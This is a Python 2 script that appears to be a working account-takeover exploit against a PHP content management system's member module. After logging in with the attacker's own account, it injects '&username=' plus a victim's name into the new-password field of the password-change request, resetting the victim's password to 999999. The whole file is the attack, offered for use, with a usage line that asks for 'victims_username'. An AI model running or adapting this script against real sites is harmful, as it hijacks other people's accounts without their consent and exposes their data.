#!/usr/bin/env python

import sys
import os
import requests
import json
import time
import re
from splinter import Browser

global debug
debug=1

class burp_accout(object):
    def __init__(self,url,username,password,v_username):
        self.url = url
        self.username = username
        self.password = password
        self.v_useranme = v_username
        self.cookies = ''
        self.ZnDbD_auth=''
        self.ZnDbD__userid=''
        self.ZnDbD__username=''
        self.ZnDbD__groupid=''
        self.ZnDbD__nickname=''
        
    def account_password_change(self):
            headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox',
                       'Content-Type':'application/x-www-form-urlencoded',}
            cookies = {'ZnDbD_auth':self.ZnDbD_auth,
                       'ZnDbD__userid':self.ZnDbD__userid,
                       'ZnDbD__username':self.ZnDbD__username,
                       'ZnDbD__groupid':self.ZnDbD__groupid,
                       'ZnDbD__nickname':self.ZnDbD__nickname,
                       'PHPSESSID':self.cookies}
            #ex:data = "info%5Bemail%5D=j%40qq.com&info%5Bpassword%5D=test11&info%5Bnewpassword%5D=999999%26username%3dtest22&dosubmit=%CC%E1%BD%BB"
            #payload= '999999%26username%3d' + self.v_useranme
            payload = '999999&username='+self.v_useranme
            print payload
            data = {
                'info[email]': 'j%40qq.com',
                'info[password]': self.password,
                'info[newpassword]':payload,
                'dosubmit':"%CC%E1%BD%BB",
            }
            
            api_url=url+"/index.php?m=member&c=index&a=account_manage_password&t=1"
            try:
                req = requests.post(api_url, data=data, headers=headers,cookies = cookies,timeout=3)
                if debug:print req.content.decode("GBK")
                print "%s can login using password:999999" % self.v_useranme
            except Exception,e:
                print e
                sys.exit(1)

    def start_login(self):
        api_url = self.url+"/index.php?m=member&c=index&a=login"
        headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox',}
        cookies = {'PHPSESSID':self.cookies}
        code = raw_input("please check the img code and input: ")
        data = {
            'forword':'',
            'username':self.username,
            'password':self.password,
            'code':code,
            'dosubmit':'%B5%C7%C2%BC',
        }
        try:
            #browser = Browser('phantomjs')
            #browser.visit(api_url,data=data,headers=headers,cookies=cookies,timeout=3)
            #resp= browser.html
            #browser.quit()            
            req = requests.post(api_url,data=data,headers=headers,cookies=cookies,timeout=3)
            resp = req.content.decode("GBK")
            if debug:print resp
        except Exception,e:
            print e
            sys.exit(1)
        pattern = re.compile('a=login',re.S)
        items = re.findall(pattern, resp)
        if items:
            pattern2 = re.compile('<div class="content guery" style="display:inline-block;display:-moz-inline-stack;zoom:1;*display:inline; max-width:280px">(.*?)</div>',re.S)
            items2 = re.findall(pattern2, resp)            
            print "login fail:%s" % items2
            sys.exit(1)
        else:
            pattern2 = re.compile('<div class="content guery" style="display:inline-block;display:-moz-inline-stack;zoom:1;*display:inline; max-width:280px">(.*?)</div>',re.S)
            items2 = re.findall(pattern2, resp)                    
            print "login success:%s" % items2
            self.ZnDbD_auth=req.cookies['ZnDbD_auth']
            self.ZnDbD__userid=req.cookies['ZnDbD__userid']
            self.ZnDbD__username=req.cookies['ZnDbD__username']
            self.ZnDbD__groupid=req.cookies['ZnDbD__groupid']
            self.ZnDbD__nickname=req.cookies['ZnDbD__nickname']
            if debug:print "auth:%s,userid:%s,username:%s,groupid:%s,nickname:%s" % (self.ZnDbD_auth,self.ZnDbD__userid,self.ZnDbD__username,self.ZnDbD__groupid,self.ZnDbD__nickname)
        



    def pre_login(self):
            api_url = self.url+'/index.php?m=member&c=index&a=login'
            #if debug: print api_url
            try:
                req = requests.get(api_url,timeout=3)
                #if debug:print req.content.decode("GBK")
                req_status = req.status_code     
            except Exception,e:
                print e
                sys.exit(1)
            if req_status == 200:
                cookies = req.cookies['PHPSESSID']
                print "get cookie:%s" % cookies
                self.cookies=cookies


    def download_code(self):
            pic_file = int(time.time())
            pic_url = self.url+"/api.php?op=checkcode&code_len=4&font_size=14&width=84&height=24&font_color=&background=&0.40671250"
            if debug:print '[+] Download Code Img: {}'.format(pic_url)
            if not (os.path.exists('./pic')) : 
                os.makedirs('./pic',0777)
                print "create img folder"
            cookies={'PHPSESSID':self.cookies}
            try:
                resp = requests.get(pic_url,cookies=cookies, verify=False, timeout=5)
                req_status = resp.status_code  
            except Exception,e:
                print e
                sys.exit(1)
            with open("./pic/%s.png"%pic_file, 'wb') as fp:
                fp.write(resp.content)
            print "file name:%s" % pic_file+'.png'



if __name__ == '__main__':
    if len(sys.argv) < 4:
        print "useage:%s url username passowrd victims_username" % sys.argv[0]
        sys.exit(1)
    url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    v_username = sys.argv[4]
    burp = burp_accout(url, username, password, v_username)
    burp.pre_login()
    burp.download_code()
    burp.start_login()
    burp.account_password_change()
    
